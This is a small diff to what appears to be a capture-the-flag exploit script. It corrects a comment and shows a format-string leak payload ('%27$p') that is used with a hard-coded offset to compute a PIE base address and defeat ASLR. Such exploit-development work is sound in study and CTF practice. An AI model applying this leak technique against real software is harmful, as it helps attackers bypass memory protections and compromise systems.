@@ -21,7 +21,7 @@ def start():
 
 p = start()
 
-# Calculate offset from 21th value in stack to pie base without aslr
+# Calculate offset from 27th value in stack to pie base without aslr
 offset = 0x5555555552bd - 0x555555554000
 
 payload = b"%27$p"
